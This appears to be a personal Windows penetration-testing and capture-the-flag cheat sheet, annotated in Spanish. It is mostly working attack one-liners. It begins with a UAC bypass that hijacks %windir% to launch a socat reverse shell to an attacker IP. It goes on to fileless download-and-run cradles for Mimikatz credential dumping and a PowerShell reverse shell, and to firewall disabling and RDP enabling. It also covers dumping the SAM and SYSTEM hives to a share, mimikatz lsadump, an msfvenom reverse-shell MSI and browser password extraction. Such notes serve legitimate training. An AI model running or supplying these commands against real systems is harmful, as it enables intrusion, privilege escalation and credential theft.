## Bypassing Always Notify - schedule task
# tarea programada
%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive

# modifica el contenido de la variable de entorno %windir%
reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4446 EXEC:cmd.exe,pipes &REM " /f
# lo que esta detras de REM queda como comentario

# inicia la tarea programada
schtasks /run  /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
-----
# PS netscan
Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress,LocalPort,ProcessName

# iniciar powershell con permisos para correr scripts
powershell.exe -nop -exec bypass
powershell -ep bypass 

# Iniciar powershell como admin
Start-Process powershell 'Start-Process cmd -Verb RunAs' -Credential adm1n

# importar modulos
Import-Module PowerUp.ps1
. \\tsclient\share\CVE-2021-1675\CVE-2021-1675.ps1 # importar modulos de una compartida

# oneLiner para correr un script
C:\> powershell.exe -exec bypass -Command “& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}”

# oneLiner para hacer un ping sweep
1..15 | %{echo "10.0.0.$_"; ping -n2 10.0.0.$_ | Select-String ttl}

# oneLiner para hacer un escaneo de puertos
1..1024 | %{echo ((New-Object Net.Sockets.TcpClient).Connect("10.0.0.$_")) "Puerto Abierto: $_"} 2>$null
for ($i=130; $i -le 140; $i++){Test-NetConnection localhost -Port $i}

# Descargar + ejecutar sin tocar el disco
C:\> powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://$PENTEST_BOX_IP/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"
powershell.exe -exec bypass -command "IEX(New-Object System.Net.WebClient).DownloadString('http://10.11.41.181:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.41.181 -Port 4444"

# Descargas via CLI en windows
powershell.exe -c Invoke-WebRequest -Uri 'http://10.8.50.72/Advanced.exe' -OutFile 'c:\program files (x86)\IObit\Advanced.exe'
IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/powerup.ps1')
C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://10.11.41.181:8000/rev.ps1')
powershell.exe -ep -Bypass -nop -noexit -c IEX"(New-Object Net.WebClient).downloadstring('http://ip/file')
powershell.exe -c "(New-Object System.Net.Webclient).DownloadFile('http://ip/file', 'c:\Users\user\file')
Invoke-WebRequest -Uri $url -OutFile $dest
certutil.exe -f -urlcache -split http://ip/file file
wget URL -UseBasicParsing -OutFile FILE
Start-BitsTransfer -Source $url -Destination $dest 

# copiar archivos desde compartida
c:\tmp>copy \\10.11.14.106\smbfolder\winPEAS.exe winPEAS.exe

# copiar archivos desde compartida 
$origen = \\LA-WIN10-LAB01\speedtest\
$destino = c:\temp\testfiles

# copiar todos los archivos de la compartida 
Copy-Item -path $source -Destination $destination -Recurse

# Firewall rules en Windows
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=in localport=PORT action=allow
netsh advfirewall firewall add rule name=NOMBRE_REGLA protocol=PROTO dir=out localport=PORT action=allow
netsh advfirewall firewall set allprofiles state off
netsh advfirewall firewall delete rule name=NOMBRE_REGLA

# Activar RDP via CLI
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# SAM Crack 
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup

copy sam.backup \\IP\smbfolder\sam
copy system.backup \\IP\smbfolder\system

pwdump system sam --> lista los hashes de las contraseñas

# AlwaysInstallElevated exploit
# consultar el estado 
reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# payload
msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=port -f msi -o payload.msi

# CMD
tasklist
taskkill /pid 1234
taskkill /F /IM notepad.exe
whoami /priv

findstr /si password *.txt
dir /b /s flag.txt C:\Users\USER 
wmic product get name,version,vendor
wmic service list brief | findstr  "Running"
wmic service get name,displayname,pathname,startmode

Start-Process notepad.exe
Get-Process -Name notepad
Get-Process | Export-Csv running_processes.csv
Get-Content ips.txt # similar a cat ips.txt
Copy-Item ips.txt backup_ips.txt
Move-Item ips.txt backup_ips.txt
Get-FileHash -Algorithm MD5 ips.txt
Get-HotFix | Format-list | findstr 'InstalledOn' 
Get-HotFix | Format-list | findstr /C:'HotFixID' /C:'InstalledOn' # multiples busquedas
(Get-NetUser).name # filtra solo el criterio "name"

# busqueda de archivos/texto
Get-ChildItem -Path C:\ -Filter 'interesting-file*' -Recurse
Get-ChildItem -Path C:\ -Filter *.bak* -Recurse
Get-ChildItem -Path C:\ -recurse | Select-String -Pattern 'API_KEY'

# b64 Decoding
certutil -decode "C:\Users\Administrator\Desktop\b64.txt" out.txt 
$file = ".\b64.txt"; $data = Get-Content $file; [System.Text.Encoding]::Ascii.GetString([System.Convert]::FromBase64String($data))

# systeminfo
python windows-exploit-suggester.py -i systeminfo -d 2021-10-04-mssb.xls --ostext 'windows 10.0.14393 N/A Build 14393' -lq
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

net localgroup Administrators --> lista los miembros del grupo Administrators
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run --> consulta los programas en autorun
icacls.exe c:\\windows\system32\SecurityHealthSystray.exe --> muestra los permisos de ejecución de un ejecutable

# Muestra el propietario de un archivo/carpeta
get-acl C:\

# Lista los usuarios y filtra por nombre o descripción
Get-Localuser
Get-Localuser -SID 'sid'
(Get-NetUser).description
(Get-NetUser).name
	
# usuarios deshabilitados
Get-NetUser -Filter "(userAccountControl:1.2.840.113556.1.4.803:=2)"

# muestra los miembros de cada grupo
Get-NetGroupMember 'Domain admins'

# Muestra recursos compartidos con permisos de lectura
Find-DomainShare -CheckShareAccess

# Enumera GPOs
Get-NetGPO

# Lista ip address
Get-NetIPAdress
ifconfig

# Lista puertos en "escucha"
Get-NetTCPConnection -State Listen | measure

# Buscar puertos abiertos
Test-NetConnection -ComputerName localhost -Port 443

# mimikatz
\\tsclient\share\x64\mimikatz.exe # ejecutar mimikatz desde una compartida
privilege::debug
token::elevate
lsadump::sam /patch

# jaws enum
powershell IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1');

# powerup enum
powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks

# SPN
setspn.exe -T medin -Q */* #extract all users in SPN

# Console_history
type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Habilitar pwn3d (crackmapexec)
net share COMPARTIDA=C:\Windows\Temp /GRANT:Administrators,FULL
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v  LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# montar compartida con usuario + contraseña via CMD
net use \\10.16.22.245\SCANNERDOC PASS /user:USER
net use U: \\10.16.22.245\SCANNERDOC * /user:USER /persistent:no
copy \\10.21.7.187\SHARE\winPEASx64.exe .

# colores en winPEAS:
REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

# WebBrowserPassView
WebBrowserPassView.exe /UseChromeProfileFolder 1 /ChromeProfileFolder "C:\Users\User\AppData\Local\Google\Chrome\User Data"

# crear objeto usuario/pass
$SecPass = ConvertTo-SecureString 'PASS' -AsPlainText -Force
$creds = New-Object System.Management.Automation PSCredential ('USER' ,$SecPass)
Invoke-WebRequest -Uri $url -OutFile $dest -Credential $creds

#Activar powershell transcription logging (historial de comandos ejecutados en powershell):
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f

# para chequear claves de usuarios que se autologuean
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" 

# runas
runas /user:administrator "type C:\Users\Administrator\Desktop\root.txt"

# winpeas
winPEASx64.exe notcolor -lolbas 2>$null